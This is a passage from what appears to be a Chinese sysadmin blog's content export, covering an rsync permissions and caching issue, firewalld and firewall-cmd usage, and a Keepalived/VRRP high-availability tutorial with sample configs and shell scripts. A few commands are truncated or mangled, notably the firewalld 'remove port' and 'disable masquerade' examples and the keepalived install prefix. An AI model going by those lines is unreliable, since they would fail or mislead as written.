sent 485 bytes received 14 bytes 332.67 bytes/sec total size is 45994 speedup is 92.17 rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1039) [sender=3.0.6] 原因：服务器同步目录权限不够或所属组\n解决 chown rsync:rsync\n原因：磁盘cache导致拷贝速度逐渐下降 [1]\nrsync拷贝数据过程中发现一个现象：开始拷贝的时候速度很快，每秒有40MB左右，但拷贝几十分钟之后就降到10MB左右了，两边机器都没有跑什么应用，网络用netcat测也没有问题\n然后我观察到的一个问题是两边的 free 命令都显示出内存占用很高，并且是buffered/cache一栏很高，因为这个缓存是可以手工释放的\nsync; echo 3 \u0026gt; /proc/sys/vm/drop_caches ssh root@new-repos 'sh -c \u0026quot;sync; echo 3 \u0026gt; /proc/sys/vm/drop_caches\u0026quot;' 补充说明\nlinux操作系统会将文件系统的内容缓存起来，以便后面用到时加速，但在数据迁移场景下，基本上没有“后面用到时”这个场景，这个缓存反而碍事（TODO: 为什么导致网络io下降） 对于本机内大量拷贝文件，有人提供了一个 nocache命令 Debian/Ubuntu 已经收录了这个工具。它的功能是临时禁用cache，用法是将要执行的命令用 nocache 包住，比如: nocache cp -a ~/ /mnt/backup/home-$(hostname)，但rsync会使用网络通讯，所以nocache rsync 对远端没有作用（ *Note however, that rsync uses sockets, so if you try a nocache rsync, only the local process will be intercepted.） 也有人在多年以前给rsync提交了一个补丁，增加了 --drop-cache 选项，但遗憾的是没被接纳，说是过于 linux-specific，开发人员的意见（见comment 3 ）是改用nocache: nocache rsync -aiv --rsync-path='nocache rsync' some-host:/src/ /dest/. P.S. nocache工具的主页最后在acknowledgements部分 说，其实它是衍生自rsync的这个补丁的。 Reference [1] rsync用于数据迁移/备份的几个细节\n","permalink":"https://www.oomkill.com/2017/05/rsync/","summary":"","title":"同步工具rsync使用指南"},{"content":"1 firewalld的配置文件 以xml格式为主\n/etc/firewalld/\r/usr/lib/firewalld/\r使用时的规则是这样的：当需要一个文件时firewalld会首先到第一个目录中查找，如果找到直接使用，否则会继续到第二个目录中查找。\n1.1 配置文件结构 firewalld的配置文件主要有两个文件和三个目录\n文件：firewalld.conf、lockdown-whitelist.xml\n目录：zone services icmptypes\n1.2 firewalld.conf firewalld的主配置文件，不过非常简单，只有五个配置项\ndefaultzone：默认使用的zone默认public\nminimalmark：标记最小值\ncleanUpOnExit：退出当前firewalld后是否清除防火墙规则，默认值为yes;\nzones\n保存zone配置文件\nservices\n保存service配置文件\nicmptypes\n保存和icmp类型相关的配置文件\n2 firewall操作 2.1 查看firewalld状态 $ firewall-cmd --state\rnot running\r$ systemctl start firewalld\r$ firewall-cmd --state\rrunning\r2.2 不改变状态的条件下重新加载防火墙 firewall-cmd --reload\r获取支持的区域列表\nfirewall-cmd --get-zone\r获得所有支持的服务\n$ firewall-cmd --get-services\rRH-Satellite-6 amanda-client bacula bacula-client dhcp dhcpv6 dhcpv6-client dns ftp high-availability http https imaps ipp ipp-client ipsec kerberos kpasswd ldap ldaps libvirt libvirt-tls mdns mountd ms-wbt mysql nfs ntp openvpn pmcd pmproxypmwebapi pmwebapis pop3s postgresql proxy-dhcp radius redis rpc-bind samba samba-client smtp ssh telnet tftp tftp-clienttransmission-client vnc-server wbem-https\r获取所有支持的ICMP类型\n$ firewall-cmd --get-icmptypes\rdestination-unreachable echo-reply echo-request parameter-problem redirect router-advertisement router-solicitation source-quench time-exceeded\r3 firewall-cmd的基础操作 3.1 设置并获得默认区域 $ firewall-cmd --set-default-zone=public\rsuccess\r$ firewall-cmd --get-default-zone\rpublic\r3.2 在不改变条件下重载防火墙 $ firewall-cmd --reload\rsuccess\r获得所有支持区域\n$ firewall-cmd --get-services\rRH-Satellite-6 amanda-client bacula bacula-client dhcp dhcpv6 dhcpv6-client dns ftp high-availability http https imaps ipp ipp-client ipsec kerberos kpasswd ldap ldaps libvirt libvirt-tls mdns mountd ms-wbt mysql nfs ntp openvpn pmcd pmproxypmwebapi pmwebapis pop3s postgresql proxy-dhcp radius redis rpc-bind samba samba-client smtp ssh telnet tftp tftp-clienttransmission-client vnc-server wbem-https\r列出全部启用区域的信息\n$ firewall-cmd --list-all-zones\rblock\rinterfaces:\rsources:\rservices:\rports:\rmasquerade: no\rforward-ports:\ricmp-blocks:\rrich rules:\rdmz\rinterfaces:\rsources:\rservices: ssh\rports:\rmasquerade: no\rforward-ports:\ricmp-blocks:\rrich rules:\r...\r...\r3.3 获得活动区域 $ firewall-cmd --get-active-zones\rpublic\rinterfaces: eth0\r3.4 禁止掉ssh服务 firewall-cmd --zone=public --remove-service=ssh\r3.5 允许某个服务生效 firewall-cmd --zone=public --add-service=ssh\r永久添加 --permanent 3.6 允许某个服务在一个时间段内生效 $ firewall-cmd --add-service=ssh --timeout=60\rsuccess\r$ firewall-cmd --list-all\rdrop (default, active)\rinterfaces: eth0\rsources:\rservices: ssh\rports:\rmasquerade: yes\rforward-ports:\ricmp-blocks:\rrich rules:\r$ firewall-cmd --list-all\rdrop (default, active)\rinterfaces: eth0\rsources:\rservices:\rports:\rmasquerade: yes\rforward-ports:\ricmp-blocks:\rrich rules:\r3.7 查询某个区域是否开启某项服务 $ firewall-cmd --zone=public --query-service=ssh\rno\r$ firewall-cmd --zone=home --query-service=ssh\ryes\r3.8 启动区域端口协议组合 此举将启用端口和协议的组合。端口可以是一个单独的端口 或者是一个端口范围 - 。协议可以是 tcp 或udp。\n$ firewall-cmd --zone=public --add-port=80/tcp\rsuccess\r$ firewall-cmd --zone=public --add-port=10000-20000/tcp\rsuccess\r$ firewall-cmd --zone=public --list-all\rpublic\rinterfaces:\rsources:\rservices: dhcpv6-client\rports: 80/tcp 10000-20000/tcp\rmasquerade: yes\rforward-ports:\ricmp-blocks:\rrich rules:\r3.9 禁用端口和协议组合 $ success\r$ firewall-cmd --zone=public --list-all\rpublic\rinterfaces:\rsources:\rservices: dhcpv6-client\rports: 80/tcp\rmasquerade: yes\rforward-ports:\ricmp-blocks:\rrich rules:\r3.10 启动IP伪装功能 此举启用区域的伪装功能。私有网络的地址将被隐藏并映射到一个公有IP。这是地址转换的一种形式，常用于路由。由于内核的限制，伪装功能仅可用于IPv4。\n$ firewall-cmd --add-masquerade --zone=home\rsuccess\r3.11 禁用ip伪装 firewall-cmd -- -masquerade --zone=home\r在区域中启用端口转发或映射\n语法：\nfirewall-cmd [--zone=] --add-forward-port=port=[-]:proto= { :toport=[-] | :toaddr=| :toport=[-]:toaddr=}\r$ firewall-cmd --add-forward-port=port=9999:proto=tcp:toaddr=192.168.2.82:toport=80\rsuccess\rhttp://www.sa-log.com/282.html\nhttp://www.fedora.hk/linux/yumwei/show_15.html\nhttps://yq.aliyun.com/ziliao/94786\n启用区域的ICMP阻塞功能\n","permalink":"https://www.oomkill.com/2017/03/firewalld/","summary":"","title":"firewalld"},{"content":"Keepalived介绍 Keepalived软件起初是专为LVS负载均衡软件设计的，用来管理并监控LVS集群系统中各个服务节点的状态，后来又加入了可以实现高可用的VRRP功能。因此，Keepalived除了能够管理LVS软件外，还可以作为其他服务（例如：Nginx、Haproxy、MySQL等）的高可用解决方案软件。\nKeepalived软件主要是通过VRRP协议实现高可用功能的。VRRP是Virtual Router Redundancy Protocol（虚拟路由器冗余协议）的缩写，VRRP出现的目的就是为了解决静态路由单点故障问题的，它能够保证当个别节点宕机时，整个网络可以不间断地运行。所以，Keepalived一方面具有配置管理LVS的功能，同时还具有对LVS下面节点进行健康检查的功能，另一方面也可实现系统网络服务的高可用功能。\nKeepalived服务的三个重要功能 管理LVS负载均衡软件 早期的LVS软件，需要通过命令行或脚本实现管理，并且没有针对LVS节点的健康检查功能。为了解决LVS的这些使用不便的问题，Keepalived就诞生了，可以说，Keepalived软件起初是专为解决LVS的问题而诞生的。因此，Keepalived和LVS的感情很深，它们的关系如同夫妻一样，可以紧密地结合，愉快地工作。Keepalived可以通过读取自身的配置文件，实现通过更底层的接口直接管理LVS的配置以及控制服务的启动、停止等功能，这使得LVS的应用更加简单方便了。LVS和Keepalived的组合应用不是本章的内容范围。\n实现对LVS集群节点健康检查功能（healthcheck） 前文已讲过，Keepalived可以通过在自身的keepalived.conf文件里配置LVS的节点IP和相关参数实现对LVS的直接管理；除此之外，当LVS集群中的某一个甚至是几个节点服务器同时发生故障无法提供服务时，Keepalived服务会自动将失效的节点服务器从LVS的正常转发队列中清除出去，并将请求调度到别的正常节点服务器上，从而保证最终用户的访问不受影响；当故障的节点服务器被修复以后，Keepalived服务又会自动地把它们加入到正常转发队列中，对客户提供服务。\n作为系统网络服务的高可用功能（failover） Keepalived可以实现任意两台主机之间，例如Master和Backup主机之间的故障转移和自动切换，这个主机可以是普通的不能停机的业务服务器，也可以是LVS负载均衡、Nginx反向代理这样的服务器。\nKeepalived高可用功能实现的简单原理为，两台主机同时安装好Keepalived软件并启动服务，开始正常工作时，由角色为Master的主机获得所有资源并对用户提供服务，角色为Backup的主机作为Master主机的热备；当角色为Master的主机失效或出现故障时，角色为Backup的主机将自动接管Master主机的所有工作，包括接管VIP资源及相应资源服务；而当角色为Master的主机故障修复后，又会自动接管回它原来处理的工作，角色为Backup的主机则同时释放Master主机失效时它接管的工作，此时，两台主机将恢复到最初启动时各自的原始角色及工作状态。\n说明：Keepalived的高可用功能是本章的重点，后面除了讲解Keepalived高可用的功能外，还会讲解Keepalived配合Nginx反向代理负载均衡的高可用的实战案例。 Keepalived高可用故障切换转移原理 Keepalived高可用服务对之间的故障切换转移，是通过VRRP（Virtual Router Redundancy Protocol，虚拟路由器冗余协议）来实现的。\n在Keepalived服务正常工作时，主Master节点会不断地向备节点发送（多播的方式）心跳消息，用以告诉备Backup节点自己还活着，当主Master节点发生故障时，就无法发送心跳消息，备节点也就因此无法继续检测到来自主Master节点的心跳了，于是调用自身的接管程序，接管主Master节点的IP资源及服务。而当主Master节点恢复时，备Backup节点又会释放主节点故障时自身接管的IP资源及服务，恢复到原来的备用角色。\n什么是VRRP VRRP，全称Virtual Router Redundancy Protocol，中文名为虚拟路由冗余协议，VRRP的出现就是为了解决静态路由的单点故障问题，VRRP是通过一种竞选机制来将路由的任务交给某台VRRP路由器的。\nVRRP早期是用来解决交换机、路由器等设备单点故障的，下面是交换、路由的Master和Backup切换原理描述，同样适用于Keepalived的工作原理。\n在一组VRRP路由器集群中，有多台物理VRRP路由器，但是这多台物理的机器并不是同时工作的，而是由一台称为Master的机器负责路由工作，其他的机器都是Backup。Master角色并非一成不变的，VRRP会让每个VRRP路由参与竞选，最终获胜的就是Master。获胜的Master有一些特权，比如拥有虚拟路由器的IP地址等，拥有系统资源的Master负责转发发送给网关地址的包和响应ARP请求。\nVRRP通过竞选机制来实现虚拟路由器的功能，所有的协议报文都是通过IP多播（Multicast）包（默认的多播地址224.0.0.18）形式发送的。虚拟路由器由VRID（范围0-255）和一组IP地址组成，对外表现为一个周知的MAC地址：00-00-5E-00-01-{VRID}。所以，在一个虚拟路由器中，不管谁是Master，对外都是相同的MAC和IP（称之为VIP）。客户端主机并不需要因Master的改变而修改自己的路由配置。对它们来说，这种切换是透明的。\n在一组虚拟路由器中，只有作为Master的VRRP路由器会一直发送VRRP广播包（VRRP Advertisement messages），此时Backup不会抢占Master。当Master不可用时，Backup就收不到来自Master的广播包了，此时多台Backup中优先级最高的路由器会抢占为Master。这种抢占是非常快速的（可能只有1秒甚至更少），以保证服务的连续性。出于安全性考虑，VRRP数据包使用了加密协议进行了加密。\n如果你在面试时，要你解答Keepalived的工作原理，建议用自己的话回答如下内容，以下为对面试官的表述：\nKeepalived高可用对之间是通过VRRP通信的：\nVRRP，全称Virtual Router Redundancy Protocol，中文名为虚拟路由冗余协议，VRRP的出现是为了解决静态路由的单点故障。 VRRP是通过一种竞选协议机制来将路由任务交给某台VRRP路由器的。 VRRP用IP多播的方式（默认多播地址（224.0.0.18））实现高可用对之间通信。 工作时主节点发包，备节点接包，当备节点接收不到主节点发的数据包的时候，就启动接管程序接管主节点的资源。备节点可以有多个，通过优先级竞选，但一般Keepalived系统运维工作中都是一对。 VRRP使用了加密协议加密数据，但Keepalived官方目前还是推荐用明文的方式配置认证类型和密码。 Keepalived服务的工作原理 介绍完了VRRP，接下来我再介绍一下Keepalived服务的工作原理：\nKeepalived高可用对之间是通过VRRP进行通信的，VRRP是通过竞选机制来确定主备的，主的优先级高于备，因此，工作时主会优先获得所有的资源，备节点处于等待状态，当主挂了的时候，备节点就会接管主节点的资源，然后顶替主节点对外提供服务。 在Keepalived服务对之间，只有作为主的服务器会一直发送VRRP广播包，告诉备它还活着，此时备不会抢占主，当主不可用时，即备监听不到主发送的广播包时，就会启动相关服务接管资源，保证业务的连续性。接管速度最快可以小于1秒。\nKeepalived高可用服务搭建 安装Keepalived 通过官方地址获取Keepalived源码软件包编译安装\n./configure \\\r--prefix=/app/keepalived-\\\r--mandir=/usr/local/share/man\rmake \u0026amp;\u0026amp; make install\r复制命令到/usr/sbin下\nln -s /app/keepalived-1.3.5/sbin/keepalived /usr/sbin/\rkeepalived默认会读取/etc/keepalived/keepalived.conf配置文件\nmkdir /etc/keepalived \u0026amp;\u0026amp; \\\rcp /app/keepalived-1.3.5/etc/keepalived/keepalived.conf /etc/keepalived/\r复制sysconfig文件到/etc/sysconfig下\ncp /app/keepalived-1.3.5/etc/sysconfig/keepalived /etc/sysconfig/\r复制启动脚本到/etc/init.d下\ncp ./keepalived/etc/init.d/keepalived /etc/init.d/\rchmod 700 /etc/init.d/keepalived\r编译错误 configure: error: libnfnetlink headers missing\ryum install -y libnfnetlink-devel\r启动错误 在centos7中，执行上面的步骤安装完毕后，/etc/init.d/start启动keepalived服务会报如下错误.这是因为centos7 编译安装keepalived会自动生成/usr/lib/systemd/system/keepalived.service单元文件。在单元文件中的启动命令调用的脚本没有执行权限，并且我们复制的启动脚本是复制到/etc/init.d目录下导致的\n$ systemctl status keepalived\r● keepalived.service - LVS and VRRP High Availability Monitor\rLoaded: loaded (/usr/lib/systemd/system/keepalived.service; disabled; vendor preset: disabled)\rActive: failed (Result: exit-code) since 五 2017-04-07 21:22:25 CST; 5s ago\rProcess: 24459 ExecStart=/app/keepalived-1.3.5/sbin/keepalived $KEEPALIVED_OPTIONS (code=exited, status=203/EXEC)\r4月 07 21:22:25 mb7 systemd[1]: Starting LVS and VRRP High Availability Monitor...\r4月 07 21:22:25 mb7 systemd[1]: keepalived.service: control process exited, code=exited status=203\r4月 07 21:22:25 mb7 systemd[1]: Failed to start LVS and VRRP High Availability Monitor.\r4月 07 21:22:25 mb7 systemd[1]: Unit keepalived.service entered failed state.\r4月 07 21:22:25 mb7 systemd[1]: keepalived.service failed.\rWarning: keepalived.service changed on disk. Run 'systemctl daemon-reload' to reload units.\r解决方法：不使用/etc/init.d/keepalived脚本启动了，修改单元文件 删掉单元文件\nkeepalived配置文件说明 这里的具备高可用功能的keepalived.conf配置文件包含了两个重要区块.\n全局定义(Global Definitions)部分 这部分主要用来设置Keepalived的故障通知机制和Router ID标识。示例代码如下：\n! Configuration File for keepalived\rglobal_defs {\rnotification_email { #←定义服务故障报警的Email地址。作用是当服务发生切换或RS节点等有故障时，发报警邮件。\r#←这几行是可选配置，notification_email指定在keepalived发生事件时，需要发送的Email地址，可以有多个，每行一个.\r171575158@qq.com\r}\r# 发送邮件的发送人，即发件人地址，可选.\rnotification_email_from Alexandre.Cassen@firewall.loc # 发送邮件的smtp服务器，如果本机开启了sendmail或postfix，就可以使用上面默认配置实现邮件发送，可选.\rsmtp_server 192.168.200.1\r# 连接smtp的超时时间，可选.\rsmtp_connect_timeout 30\r# Keepalived服务器的路由标识（router_id）。在一个局域网内，router_id应该是唯一的.\rrouter_id LVS_01 }\r注意：第4~11行所有和邮件报警相关的参数均可以不配，在实际工作中会将监控的任务交给更加擅长监控报警的Nagios或Zabbix软件。\nVRRP实例定义区块(VRRP instance(s)部分 # 定义一个vrrp_instance实例,名字是VI_1,每个vrrp_instance实例可以认为是Keepalived服务的一个实例或者作为一个业务服务，\r# 在Keepalived服务配置中,这样的vrrp_instance实例可以有多个.注意,存在于主节点中的vrrp_instance实例在备节点中也要存在，\r# 这样才能实现故障切换接管.\rvrrp_instance VI_1 {\r# state MASTER表示当前实例VI_1的角色状态,当前角色为MASTER,这个状态只能有MASTER和BACKUP两种状态,并且需要大写这些字符。\r# 其中MASTER为正式工作的状态,BACKUP为备用的状态.当MASTER所在的服务器故障或失效时，\r# BACKUP所在的服务器会接管故障的MASTER继续提供服务.\rstate MASTER\r# interface为网络通信接口.为对外提供服务的网络接口,如eth0、eth1。当前主流的服务器都有2~4个网络接口。\rinterface eth0 # 虚拟路由ID标识,这个标识最好是一个数字,并且要在一个keepalived.conf配置中是唯一的。\r# 但是MASTER和BACKUP配置中相同实例的virtual_router_id又必须是一致的,否则将出现脑裂问题.\rvirtual_router_id 51 # 优先级,其后面的数值也是一个数字,数字越大,表示实例优先级越高.在同一个vrrp_instance实例里，\r# MASTER的优先级配置要高于BACKUP的.若MASTER的priority值为150,那么BACKUP的priority必须小于150，\r# 一般建议间隔50以上为佳,例如：设置BACKUP的priority为100或更小的数值。\rpriority 150 # 同步通知间隔.MASTER与BACKUP之间通信检查的时间间隔,单位为秒,默认为1。\radvert_int 1\r# 权限认证配置.包含认证类型（auth_type）和认证密码（auth_pass）；\r# 认证类型有PASS(Simple Passwd(suggested))、AH(IPSEC(not recommended))两种。\r# 官方推荐使用的类型为PASS.验证密码为明文方式，最好长度不要超过8个字符，建议用4位的数字，\r# 同一vrrp实例的MASTER与BACKUP使用相同的密码才能正常通信。\rauthentication {\rauth_type PASS\rauth_pass 1111\r}\r# 虚拟IP地址.可以配置多个IP地址,每个地址占一行,配置时最好明确指定子网掩码以及虚拟IP绑定的网络接口。\r# 否则,子网掩码默认是32位,绑定的接口和前面的interface参数配置的一致。\r# 注意,这里的虚拟IP就是在工作中需要和域名绑定的IP,即和配置的高可用服务监听的IP要保持一致.\rvirtual_ipaddress { 192.168.2.120\r}\r}\rKeepalived高可用服务单实例 当没有配置高可用服务时，如果服务器宕机了怎么解决呢？无非就是找一个新服务器，配好域名解析的那个原IP，然后搭好相应的网络服务罢了，只不过手工去实现这个过程会比较漫长，相比而言，自动化切换效率更高，效果更好，而且还可以有更多的功能，例如：发送ARP广播，触发执行相关脚本动作等。\n实际上也可以将高可用对的两台机器应用服务同时开启，但是只让有VIP一端的服务器提供服务，若主的服务器宕机，VIP会自动漂移到备用服务器上，此时用户的请求直接发送到备用服务器上，而无需临时启动对应服务（事先开启应用服务）。\n实战配置Keepalived主服务器lb01 master 首先，配置lb01 MASTER的keepalived.conf配置文件，操作步骤如下：\n删掉已有的所有默认配置：\nvim /etc/keepalived/keepalived.conf\r! Configuration File for keepalived\rglobal_defs {\rnotification_email {\r171575158@qq.com\r}\rnotification_email_from Alexandre.Cassen@firewall.loc\rsmtp_server 192.168.200.1\rsmtp_connect_timeout 30\rrouter_id LVS_01 #\u0026lt;==id为lb01，不同的keepalived.conf此ID要唯一\rvrrp_skip_check_adv_addr\rvrrp_strict\rvrrp_garp_interval 0\rvrrp_gna_interval 0\r}\rvrrp_instance VI_1 { #←实例名字为VI_1,相同实例的备节点名字要和这个相同\rstate MASTER\t#←状态为MASTER,备节点状态需要为BACKUP\rinterface eth0 #←通信接口为eth0，此参数备节点设置和主节点相同\rvirtual_router_id 51 #←实例ID为51，keepalived.conf里唯一\rpriority 150\t#←优先级为150，备节点的优先级必须比此数字低\radvert_int 1\t#←通信检查间隔时间1秒\rauthentication {\t#←PASS认证类型，此参数备节点设置和主节点相同\rauth_type PASS\rauth_pass 1111\r}\r#←虚拟IP，即VIP为192.168.2.120,子网掩码为24位，绑定接口为eth0，别名为eth0:1，此参数备节点设置和主节点相同\rvirtual_ipaddress {\r192.168.2.120 }\r}\r配置完毕后，启动Keepalived服务，然后检查配置结果，查看是否有虚拟IP 192.168.2.120。\n$ ip addr|grep 192.168.2.120\rinet 192.168.2.120/24 scope global secondary eth0\r配置Keepalived备服务器lb02 backup ! Configuration File for keepalived\rglobal_defs {\rnotification_email {\r171575158@qq.com\r}\rnotification_email_from Alexandre.Cassen@firewall.loc\rsmtp_server 192.168.200.1\rsmtp_connect_timeout 30\rrouter_id LVS_02 vrrp_skip_check_adv_addr\rvrrp_strict\rvrrp_garp_interval 0\rvrrp_gna_interval 0\r}\rvrrp_instance VI_1 { state BACKUP\rinterface eth0 virtual_router_id 51 priority 100\tadvert_int 1\tauthentication {\tauth_type PASS\rauth_pass 1111\r}\rvirtual_ipaddress {\r192.168.2.120 }\r}\r配置完毕后重启服务，检查配置结果，查看是否有虚拟IP 192.168.2.120。\n$ ip addr|grep 192.168.2.120\r#←没有返回任何结果就对了,因为lb02为BACKUP,当主节点活着的时候,它不会接管VIP 192.168.2.120\r出现无任何结果的现象，表示lb02的Keepalived服务单实例配置成功。如果有192.168.2.120的IP，则表示Keepalived工作不正常，说明高可用裂脑了，裂脑是两台服务器争抢同一资源导致的，同一个IP地址同一时刻应该只能出现一台服务器。\n出现上述两台服务器争抢同一IP资源问题，先考虑排查两个地方：\n主备两台服务器之间是否通信正常，如果不正常是否有iptables防火墙阻挡？ 主备两台服务器对应的keepalived.conf配置文件是否有错误？例如，是否同一实例的virtual_router_id配置不一致。 高可用主备服务器切换 停掉主服务器上的Keealived服务或关闭主服务器\n$ ip addr|grep 192.168.2.120\rinet 192.168.2.120/24 scope global secondary eth0\r$ /etc/init.d/keepalived stop\rStopping keepalived (via systemctl): [ 确定 ]\r$ ip addr|grep 192.168.2.120 #←查看VIP消失了\r$\r此时查看BACKUP备服务器，看是否会有VIP 出现\n$ ip addr|grep 192.168.2.120\rinet 192.168.2.120/24 scope global secondary eth0\r可以看到备节点lb02已经接管绑定了VIP，这期间备节点还会发送ARP广播，让所有的客户端更新本地的ARP表，以便客户端访问新接管VIP服务的节点。\n此时如果再启动主服务器的Keealived服务，主服务器就会接管回VIP 10.0.0.12，启动后可以观察下主备的IP漂移情况，备服务器是否释放了IP？主服务器是否又接管了IP？\n$ /etc/init.d/keepalived start\rStarting keepalived (via systemctl): [ 确定 ]\r$ ip addr|grep 192.168.2.120\rinet 192.168.2.120/24 scope global secondary eth0\r$ ip addr|grep 192.168.2.120\t#←备节点上的VIP则被释放了\r检查nginx + keepalived工作 当主节点工作是，web页面如下：\n此时模拟主节点宕机后查看nginx是否正常工作\n多实例 keepalive01.conf\n! Configuration File for keepalived\rglobal_defs {\rnotification_email {\r171575158@qq.com\r}\rnotification_email_from Alexandre.Cassen@firewall.loc\rsmtp_server 192.168.200.1\rsmtp_connect_timeout 30\rrouter_id LVS_02\r}\rvrrp_instance VI_1 {\rstate BACKUP\rinterface eth0\rvirtual_router_id 51\rpriority 140\radvert_int 1\rauthentication {\rauth_type PASS\rauth_pass 1111\r}\rvirtual_ipaddress {\r10.0.0.10/24\r}\r}\rvrrp_instance VI_2 {\rstate BACKUP\rinterface eth0\rvirtual_router_id 52\rpriority 141\radvert_int 1\rauthentication {\rauth_type PASS\rauth_pass 1111\r}\rvirtual_ipaddress {\r10.0.0.11/24\r}\r}\rkeepalived04.conf\n! Configuration File for keepalived\rglobal_defs {\rnotification_email {\r171575158@qq.com\r}\rnotification_email_from Alexandre.Cassen@firewall.loc\rsmtp_server 192.168.200.1\rsmtp_connect_timeout 30\rrouter_id LVS_01\r}\rvrrp_instance VI_1 {\rstate MASTER\rinterface eth0\rvirtual_router_id 51\rpriority 150\radvert_int 1\rauthentication {\rauth_type PASS\rauth_pass 1111\r}\rvirtual_ipaddress {\r10.0.0.10/24\r}\r}\rvrrp_instance VI_2 {\rstate MASTER\rinterface eth0\rvirtual_router_id 52\rpriority 151\radvert_int 1\rauthentication {\rauth_type PASS\rauth_pass 1111\r}\rvirtual_ipaddress {\r10.0.0.11/24\r}\r}\r$ ip addr|grep 10.0.0\rinet 10.0.0.10/24 scope global eth0\r$ ip addr|grep 10.0.0\rinet 10.0.0.11/24 scope global eth0\r$ /etc/init.d/keepalived stop\rStopping keepalived (via systemctl): [ 确定 ]\r$ ip addr|grep 10.0.0\r$\r$ ip addr|grep 10.0.0\rinet 10.0.0.10/24 scope global eth0\rinet 10.0.0.11/24 scope global secondary eth0\rKeepalived高可用服务器的 “裂脑” 问题 什么是裂脑 由于某些原因，导致两台高可用服务器对在指定时间内，无法检测到对方的心跳消息，各自取得资源及服务的所有权，而此时的两台高可用服务器对都还活着并在正常运行，这样就会导致同一个IP或服务在两端同时存在而发生冲突，最严重的是两台主机占用同一个VIP地址，当用户写入数据时可能会分别写入到两端，这可能会导致服务器两端的数据不一致或造成数据丢失，这种情况就被称为裂脑。\n导致裂脑发生的原因 一般来说，裂脑的发生，有以下几种原因：\n高可用服务器对之间心跳线链路发生故障，导致无法正常通信。 心跳线坏了（包括断了，老化）。 网卡及相关驱动坏了，IP配置及冲突问题（网卡直连）。 心跳线间连接的设备故障（网卡及交换机）。 仲裁的机器出问题（采用仲裁的方案）。 高可用服务器上开启了iptables防火墙阻挡了心跳消息传输。 高可用服务器上心跳网卡地址等信息配置不正确，导致发送心跳失败。 其他服务配置不当等原因，如心跳方式不同，心跳广播冲突、软件Bug等。 提示：Keepalived配置里同一VRRP实例如果virtual_router_id两端参数配置不一致，也会导致裂脑问题发生。\n解决裂脑的常见方案 在实际生产环境中，我们可以从以下几个方面来防止裂脑问题的发生：\n同时使用串行电缆和以太网电缆连接，同时用两条心跳线路，这样一条线路坏了，另一个还是好的，依然能传送心跳消息。\n当检测到裂脑时强行关闭一个心跳节点（这个功能需特殊设备支持，如Stonith、fence）。相当于备节点接收不到心跳消息，通过单独的线路发送关机命令关闭主节点的电源。\n做好对裂脑的监控报警（如邮件及手机短信等或值班），在问题发生时人为第一时间介入仲裁，降低损失。例如，百度的监控报警短信就有上行和下行的区别。报警信息发送到管理员手机上，管理员可以通过手机回复对应数字或简单的字符串操作返回给服务器，让服务器根据指令自动处理相应故障，这样解决故障的时间更短。\n当然，在实施高可用方案时，要根据业务实际需求确定是否能容忍这样的损失。对于一般的网站常规业务，这个损失是可容忍的。\n解决Keepalived裂脑的常见方案 作为互联网应用服务器的高可用，特别是前端Web负载均衡器的高可用，裂脑的问题对普通业务的影响是可以忍受的，如果是数据库或者存储的业务，一般出现裂脑问题就非常严重了。因此，可以通过增加冗余心跳线路来避免裂脑问题的发生，同时加强对系统的监控，以便裂脑发生时人为快速介入解决问题。\n如果开启防火墙，一定要让心跳消息通过，一般通过允许IP段的形式解决。 可以拉一条以太网网线或者串口线作为主被节点心跳线路的冗余。 开发监测程序通过监控软件（例如Nagios）监测裂脑。 下面是生产场景检测裂脑故障的一些思路： 简单判断的思想：只要备节点出现VIP就报警，这个报警有两种情况，一是主机宕机了备机接管了；二是主机没宕，裂脑了。不管属于哪个情况，都进行报警，然后由人工查看判断及解决。 比较严谨的判断：备节点出现对应VIP，并且主节点及对应服务（如果能远程连接主节点看是否有VIP就更好了）还活着，就说明发生裂脑了。 检测裂脑脚本 #!/bin/sh\rvip=192.168.2.120\rip=192.168.2.24\rfunction check()\r{\rping -c 2 -W 3 $ip \u0026amp;\u0026gt;/dev/null\rif [ $? -eq 0 -a `ip addr|grep $vip|wc -l` -eq 1 ]\rthen\recho 'fail'\relse\recho ok\rfi\r}\rwhile true\rdo\rcheck\rdone\r解决服务监听的网卡上不存在IP地址问题 如果配置使用listen 10.0.0.12：80;的方式指定IP监听服务，而本地的网卡上没有10.0.0.12这个IP，Nginx就会报错：\nroot@lb01 ~]# /app/nginx/sbin/nginx\rnginx [emerg] bind(to 10.0.0.12 80 failed 99 Cannot assign requested address)\r如果要实施双主即主备同时跑不同的业务，配置文件里指定了IP监听，备节点则会因为网卡实际不存在VIP也报错。\n出现上面问题的原因就是在物理网卡上没有与配置文件里监听的IP相对应的IP，解决办法是在/etc/sysctl.conf中加入如下内核参数配置：\nnet.ipv4.ip_nonlocal_bind = 1\r也可通过如下命令快速追加：\necho 'net.ipv4.ip_nonlocal_bind = 1' \u0026gt;\u0026gt; /etc/sysctl.conf\r注：net.ipv4.ip_nonlocal_bind = 1 #此项表示启动nginx而忽略配置中监听的VIP是否存在，它同样适合Haproxy.\n最后执行sysctl-p使上述修改生效。\n解决高可用服务只针对物理服务器的问题 默认情况下Keepalived软件仅仅在对方机器宕机或Keepalived停掉的时候才会接管业务。但在实际工作中，有业务服务停止而Keepalived服务还在工作的情况，这就会导致用户访问的VIP无法找到对应的服务，那么，如何解决业务服务宕机可以将IP漂移到备节点使之接管提供服务？\n第一个方法：可以写守护进程脚本来处理。当Nginx业务有问题时，就停掉本地的Keepalived服务，实现IP漂移到对端继续提供服务。实际工作中部署及开发的示例脚本如下：\n#!/bin/sh\rwhile true\rdo\rif [ `ps -ef|grep nginx|grep -v grep|wc -l` -lt 2 ]; then\r/etc/init.d/keepalived stop \u0026amp;\u0026gt;/dev/null\rfi\rsleep 15\rdone\r后台运行脚本后停止nginx服务，查看进程状态，发现脚本会自动执行命令停止keepalived服务.\n$ ps -ef|grep keep\rroot 3735 1 0 00:48 ? 00:00:00 keepalived -D\rroot 3738 3735 0 00:48 ? 00:00:00 keepalived -D\rroot 3782 3686 0 00:48 pts/2 00:00:00 /bin/sh /etc/init.d/keepalived stop\rroot 3791 3782 0 00:48 pts/2 00:00:00 /bin/systemctl stop keepalived.service\rroot 3797 1 0 00:48 ? 00:00:00 /bin/sh /etc/rc.d/init.d/keepalived stop\r此时查看备节点状态，可以看出，备节点已经接管服务.\n$ ip addr|grep 192.168.2.120\r$ ip addr|grep 192.168.2.120\rinet 192.168.2.120/24 scope global secondary eth0\r配置指定文件接收Keepalived服务日志 默认情况下Keepalived服务日志会输出到系统日志/var/log/messages，和其他日志信息混合在一起，很不方便，可以将其调整成由独立的文件记录Keepalived服务日志。操作步骤如下：\n1. 